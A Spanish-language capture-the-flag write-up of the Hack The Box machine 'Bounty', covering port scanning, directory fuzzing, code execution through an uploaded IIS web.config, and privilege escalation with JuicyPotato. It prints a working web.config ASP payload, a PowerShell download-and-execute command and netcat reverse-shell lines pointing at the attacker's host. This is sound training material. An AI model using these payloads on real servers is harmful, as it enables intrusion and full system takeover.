---
layout: post
title: HTB_Bounty
date: 2023/07/10
slug: HTB_Bounty
heroImage: /assets/machines.jpg
---

# Bounty {-}

## Introduccion {-}

La maquina del dia 20/08/2021 se llama Bounty.

El replay del live se puede ver aqui

[![S4vitaar Bounty maquina](https://img.youtube.com/vi/eY0ENzTwv_M/0.jpg)](https://www.youtube.com/watch?v=eY0ENzTwv_M)

No olvideis dejar un like al video y un commentario...
## Enumeracion {-}

### Reconocimiento de maquina, puertos abiertos y servicios {-} 

#### Ping {-}

```bash
ping -c 1 10.10.10.93
```
ttl: 127 -> maquina Windows

#### Nmap {-}

```bash
nmap -p- --open -T5 -v -n 10.10.10.93
```

Va lento

```bash
nmap -sS -p- --open --min-rate 5000 -vvv -n -Pn 10.10.10.93 -oG allPorts 
extractPorts allPorts
nmap -sC -sV -p80 10.10.10.93 -oN targeted
```


| Puerto | Servicio | Que se nos occure? | Que falta? |
| ------ | -------- | ------------------ | ---------- |
| 80     | http     | Web, Fuzzing       |            |


### Analyzando la web {-}

#### Whatweb {-}

```bash
whatweb http://10.10.10.93
```

Estamos en frente de un IIS

#### Analyzando la web con Firefox {-}

Vemos una imagen de Merlin ;)

#### Fuzzing con WFuzz {-}

```bash
wfuzz -c -t 200 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.93/FUZZ
```

Encontramos una routa 
```bash
 uploadedFiles 
```
, probamos con una extension 
```bash
 .aspx 
```
 porque es un IIS

```bash
wfuzz -c -t 200 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.93/FUZZ.aspx
```

Encontramos una routa 
```bash
 transfer.aspx 
```


Si la analyzamos con firefox, vemos una pagina que nos permite subir ficheros.
## Vulnerability Assessment {-}

### Vulnerabilidad IIS en file upload {-}

Buscamos en internet sobre la busqueda 
```bash
 iis upload exploit 
```
. Encontramos una pagina interesante en [ivoidwarranties](https://www.ivoidwarranties.tech/posts/pentesting-tuts/iis/web-config/).
Uploadeando un fichero 
```bash
 web.config 
```
 podriamos ejecutar comandos a nivel de systema.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
   <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
         <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />         
      </handlers>
      <security>
         <requestFiltering>
            <fileExtensions>
               <remove fileExtension=".config" />
            </fileExtensions>
            <hiddenSegments>
               <remove segment="web.config" />
            </hiddenSegments>
         </requestFiltering>
      </security>
   </system.webServer>
</configuration>
<!-- ASP code comes here! It should not include HTML comment closing tag and double dashes!
<%
Response.write("-"&"->")
' it is running the ASP code if you can see 3 by opening the web.config file!
Response.write(1+2)
Response.write("<!-"&"-")
%>
-->
```

Lo subimos en la red y controlamos en la routa 
```bash
 http://10.10.10.93/uploadedFiles/web.config 
```


Aqui vemos que el codigo se a ejecutado. Ahora necessitamos ver si podemos ejecutar codigo a nivel de systema.

Buscamos en la pagina [Hacking Dream](https://www.hackingdream.net/search?q=reverse) un one linear que nos permite entablar una reverse
shell con ASP.

La añadimos al web.config y la modificamos.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
   <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
         <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />         
      </handlers>
      <security>
         <requestFiltering>
            <fileExtensions>
               <remove fileExtension=".config" />
            </fileExtensions>
            <hiddenSegments>
               <remove segment="web.config" />
            </hiddenSegments>
         </requestFiltering>
      </security>
   </system.webServer>
</configuration>
<!-- ASP code comes here! It should not include HTML comment closing tag and double dashes!
<%
Set co = CreateObject("WScript.Shell")
Set cte = co.Exec("ping 10.10.14.7")
output = cte.StdOut.Readall()
Response.write(output)
%>
-->
```

Nos ponemos en escucha de trazas ICMP 
```bash
 tcpdump -i tun0 icmp -n 
```
 y enviamos el fichero nuevamente y vemos que recibimos la traza ICMP.
## Vuln exploit & Gaining Access {-}

### Ganando accesso con un web.config {-}

Aqui trabajaremos con Nishang porque nos queremos entablar una PowerShell.

1. Descargamos Nishang y modificamos el fichero de reverse shell por tcp

    ```bash
    git clone https://github.com/samratashok/nishang
    cd nishang/Shells
    cp Invoke-PowerShellTcp.ps1 ../../PS.ps1
    cd ../..
    nano PS.ps1
    ```

    Modificamos el fichero PS.ps1 para añadir 
```bash
 Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.7 -Port 443 
```
 al final del fichero

1. Modificamos el web.config para que descarge el fichero PS.ps1 al momento que lo lanzemos.

    ```xml
    <?xml version="1.0" encoding="UTF-8"?>
    <configuration>
    <system.webServer>
        <handlers accessPolicy="Read, Script, Write">
            <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />         
        </handlers>
        <security>
            <requestFiltering>
                <fileExtensions>
                <remove fileExtension=".config" />
                </fileExtensions>
                <hiddenSegments>
                <remove segment="web.config" />
                </hiddenSegments>
            </requestFiltering>
        </security>
    </system.webServer>
    </configuration>
    <!-- ASP code comes here! It should not include HTML comment closing tag and double dashes!
    <%
    Set co = CreateObject("WScript.Shell")
    Set cte = co.Exec("cmd /c powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.14.7/PS.ps1')")
    output = cte.StdOut.Readall()
    Response.write(output)
    %>
    -->
    ```

1. Uploadeamos el fichero en la web

1. Lanzamos un servidor web con pyhton

    ```bash
    python -m http.server 80
    ```

1. Nos ponemos en escucha por el puerto 443

    ```bash
    rlwrap nc -nlvp 443
    ```

1. Navigamos al url 
```bash
 http://10.10.10.93/uploadedFiles/web.config 
```


Y vemos que ganamos accesso al systema

```bash
whoami

#Output
bounty\merlin
```
## Privilege Escalation {-}

### Rootear la maquina {-}

```bash
systeminfo
whoami /priv
```

Aqui vemos que tenemos el 
```bash
 SeImpersonatePrivilege 
```
 ;)

Tiramos como siempre de JuicyPotatoe.exe

Lo descargamos en la maquina de atacante y lo enviamos a la victima.

```bash
wget https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe
cp /usr/share/sqlninja/apps/nc.exe
python3 -m http.server 80
```

En la maquina victima lo descargamos

```bash
cd C:\Windows\Temp
mkdir privesc
cd privesc
iwr -uri http://10.10.14.7/JuicyPotato.exe -OutFile JuicyPotato.exe
iwr -uri http://10.10.14.7/nc.exe -OutFile nc.exe
```

Nos ponemos en escucha por el puerto 443

```bash
rlwrap nc -nlvp 443
```

Nos connectamos con el servicio nc con el JuicyPotato.

```bash
./JuicyPotato.exe -t * -l 1337 -p C:\Windows\System32\cmd.exe -a "/c .\nc.exe -e cmd 10.10.14.7 443"
```

Aqui nos sale une error 10038. Esto suele passar cuando el CLSID no es el correcto. Como savemos con el systeminfo
que estamos en una maquina Windows10 Enterprise, podemos buscar el CLSID correcto en [Interesting CLSID](https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md)
encontramos el CLSID que corresponde y con el parametro 
```bash
 -c 
```


```bash
./JuicyPotato.exe -t * -l 1337 -p C:\Windows\System32\cmd.exe -a "/c .\nc.exe -e cmd 10.10.14.7 443" -c "{5B3E6773-3A99-4A3D-8096-7765DD11785C}"
```

La reverse shell nos a functionnado y con 
```bash
 whoami 
```
 vemos que ya somos nt authority\system y podemos ver la flag.

